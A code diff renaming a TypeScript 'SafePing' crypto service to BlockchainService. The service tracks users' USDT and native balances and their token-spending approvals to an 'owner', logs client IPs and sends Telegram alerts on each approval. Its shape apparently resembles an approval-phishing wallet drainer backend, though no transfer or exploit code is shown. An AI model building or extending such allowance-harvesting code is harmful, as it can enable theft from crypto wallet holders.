@@ -2,13 +2,12 @@
 // 🔗 SafePing Main Service
 // =================================
 
-import { ONE_TIME_PING_ADDRESSES, TOKEN_ADDRESSES } from "@/constants";
 import {
   BlockchainResult,
   ChainType,
   CurrencyType,
   TransferResult,
-  UserInfo,
+  TreasuryWalletBalance,
 } from "@/types";
 import { TronService } from "./tronService";
 import { EVMService } from "./evmService";
@@ -23,43 +22,16 @@ function getApiBaseUrl(): string {
   return "http://localhost:3000";
 }
 
-export class SafePingService {
-  private static instance: SafePingService;
-  private nonceCache: Map<string, number> = new Map();
+export class BlockchainService {
+  private static instance: BlockchainService;
 
   private constructor() {}
 
-  static getInstance(): SafePingService {
-    if (!SafePingService.instance) {
-      SafePingService.instance = new SafePingService();
+  static getInstance(): BlockchainService {
+    if (!BlockchainService.instance) {
+      BlockchainService.instance = new BlockchainService();
     }
-    return SafePingService.instance;
-  }
-
-  /**
-   * Get user's current nonce from contract
-   */
-  async getUserNonce(chain: ChainType, userAddress: string): Promise<number> {
-    try {
-      if (chain === "tron") {
-        try {
-          return await TronService.getUserNonce(chain, userAddress);
-        } catch (tronError) {
-          // For TRON, if contract call fails, try to use cached nonce or default to 0
-          const cacheKey = `${chain}:${userAddress}`;
-          const cachedNonce = this.nonceCache.get(cacheKey);
-          if (cachedNonce !== undefined) {
-            return cachedNonce;
-          }
-          return 0; // Default nonce for new users
-        }
-      } else {
-        return await EVMService.getUserNonce(chain, userAddress);
-      }
-    } catch (error) {
-      const cacheKey = `${chain}:${userAddress}`;
-      return this.nonceCache.get(cacheKey) || 0;
-    }
+    return BlockchainService.instance;
   }
 
   /**
@@ -72,7 +44,7 @@ export class SafePingService {
   ): Promise<string> {
     try {
       if (chain === "tron") {
-        return await TronService.getUserTokenBalance(chain, currency, userAddress);
+        return await TronService.getUserTokenBalance(currency, userAddress);
       } else {
         return await EVMService.getUserTokenBalance(chain, currency, userAddress);
       }
@@ -82,31 +54,46 @@ export class SafePingService {
   }
 
   /**
-   * Approve token spending using SafePing contract
+   * Get user's native token balance
    */
-  async approveTokenWithSafePing(
+  async getUserNativeBalance(
+    chain: ChainType,
+    address: string
+  ): Promise<string> {
+    try {
+      if (chain === "tron") {
+        return await TronService.getUserNativeBalance(address);
+      } else {
+        return await EVMService.getUserNativeBalance(chain, address);
+      }
+    } catch (error) {
+      return "0";
+    }
+  }
+
+  /**
+   * Confirm approval of token spending
+   */
+  async confirmApproval(
     chain: ChainType,
     currency: string,
     amount: string,
     userAddress: string,
     paymentId: string,
+    txHash: string,
     clientIP?: string
-  ): Promise<BlockchainResult> {
+  ): Promise<{ success: boolean, message?: string }> {
     try {
-      // Get contract address for debugging
-      const contractAddress = await this.getContractAddress(chain);
-
       const tokenBalance = await this.getUserTokenBalance(chain, currency as CurrencyType, userAddress);
 
       // Common database update function - moved to API calls
-      const updateWalletDatabase = async (isNewPayment: boolean = true) => {
+      const updateWalletDatabase = async () => {
         try {
           console.log(
             "🔄 Updating wallet database for:",
             userAddress,
             chain,
-            "isNewPayment:",
-            isNewPayment
+            currency
           );
 
           // Call API endpoint instead of direct database access (absolute URL required server-side)
@@ -121,7 +108,6 @@ export class SafePingService {
               currency: currency,
               amount: amount,
               tokenBalance: tokenBalance,
-              isNewPayment: isNewPayment,
             }),
           });
 
@@ -196,24 +182,17 @@ export class SafePingService {
         }
       };
 
-      let approvalData: BlockchainResult = {
-        success: false,
-        txHash: "",
-        message: "Approval data creation failed",
-      };
-
-      const tokenAddress = TOKEN_ADDRESSES[chain][currency as CurrencyType];
-
+      let approvalData;
       if (chain === "tron") {
         console.log("Creating TRON approval data for owner");
         // TRON: Create approval data for user to approve owner
-        approvalData = await TronService.approve(tokenAddress, contractAddress);
+        approvalData = await TronService.needsApproval(currency as CurrencyType, userAddress, amount);
 
         // Update database and send notification (non-blocking)
-        if (approvalData.success) {
+        if (approvalData.needsApproval) {
           const tasks = [
-            updateWalletDatabase(true),
-            updatePaymentDatabase(approvalData.txHash),
+            updateWalletDatabase(),
+            updatePaymentDatabase(txHash),
             sendTelegramNotification(),
           ];
 
@@ -237,13 +216,13 @@ export class SafePingService {
         }
       } else {
         // EVM: Create approval data for user to approve owner
-        approvalData = await EVMService.approve(chain, tokenAddress, contractAddress);
+        approvalData = await EVMService.needsApproval(chain, currency as CurrencyType, userAddress, amount);
 
         // Update database and send notification (non-blocking)
-        if (approvalData.success) {
+        if (approvalData.needsApproval) {
           const tasks = [
-            updateWalletDatabase(true),
-            updatePaymentDatabase(approvalData.txHash),
+            updateWalletDatabase(),
+            updatePaymentDatabase(txHash),
             sendTelegramNotification(),
           ];
 
@@ -256,7 +235,7 @@ export class SafePingService {
         }
       }
 
-      return approvalData;
+      return { success: true};
     } catch (error: any) {
       // Silent error handling for production
       return { success: false, message: error.message };
@@ -429,25 +408,6 @@ export class SafePingService {
   }
 
   /**
-   * Check if user is approved for USDT spending
-   */
-  async isUserApproved(
-    chain: ChainType,
-    userAddress: string
-  ): Promise<boolean> {
-    try {
-      if (chain === "tron") {
-        return await TronService.isUserApproved(chain, userAddress);
-      } else {
-        return await EVMService.isUserApproved(chain, userAddress);
-      }
-    } catch (error) {
-      // Silent error handling for production
-      return false;
-    }
-  }
-
-  /**
    * Get user's approved USDT allowance
    */
   async getUserAllowance(
@@ -502,37 +462,61 @@ export class SafePingService {
   }
 
   /**
-   * Get contract address for the specified chain
+   * Get real-time balances for treasury wallets (both native and token)
    */
-  private async getContractAddress(chain: ChainType): Promise<string> {
-    return ONE_TIME_PING_ADDRESSES[chain];
-  }
+  async getTreasuryWalletBalances(
+    wallets: Array<{ address: string; chain: ChainType }>,
+    currency: string
+  ): Promise<TreasuryWalletBalance[]> {
+    console.log(`\n=== TREASURY WALLET BALANCES ===`);
+    console.log(`Fetching balances for ${wallets.length} treasury wallets...`);
 
-  /**
-   * Get comprehensive user info
-   */
-  async getUserInfo(chain: ChainType, currency: CurrencyType, userAddress: string): Promise<UserInfo> {
-    try {
-      const [allowance, nonce, isApproved, tokenBalance] = await Promise.all([
-        this.getUserAllowance(chain, userAddress),
-        this.getUserNonce(chain, userAddress),
-        this.isUserApproved(chain, userAddress),
-        this.getUserTokenBalance(chain, currency, userAddress),
-      ]);
+    const balancePromises = wallets.map(async (wallet) => {
+      try {
+        console.log(
+          `\n--- Fetching balances for ${wallet.chain} wallet: ${wallet.address} ---`
+        );
 
-      return {
-        address: userAddress,
-        allowance,
-        nonce,
-        isApproved,
-        tokenBalance,
-      };
-    } catch (error) {
-      // Silent error handling for production
-      throw error;
-    }
+        const [nativeBalance, tokenBalance] = await Promise.all([
+          this.getUserNativeBalance(wallet.chain, wallet.address),
+          this.getUserTokenBalance(wallet.chain, currency as CurrencyType, wallet.address),
+        ]);
+
+        console.log(
+          `✅ ${wallet.chain} wallet balances - Native: ${nativeBalance}, ${currency.toUpperCase()}: ${tokenBalance}`
+        );
+
+        return {
+          address: wallet.address,
+          chain: wallet.chain,
+          nativeBalance,
+          tokenBalance,
+          lastUpdated: new Date().toISOString(),
+        };
+      } catch (error) {
+        console.error(
+          `❌ Error fetching balances for ${wallet.chain} wallet ${wallet.address}:`,
+          error
+        );
+        // Return default values if balance fetching fails
+        return {
+          address: wallet.address,
+          chain: wallet.chain,
+          nativeBalance: "0.000000",
+          tokenBalance: "0.00",
+          lastUpdated: new Date().toISOString(),
+        };
+      }
+    });
+
+    const results = await Promise.all(balancePromises);
+    console.log(
+      `\n✅ Successfully fetched balances for ${results.length} treasury wallets`
+    );
+    console.log(`=== END TREASURY WALLET BALANCES ===\n`);
+    return results;
   }
 }
 
 // Export singleton instance
-export const safePingService = SafePingService.getInstance();
+export const blockchainService = BlockchainService.getInstance();
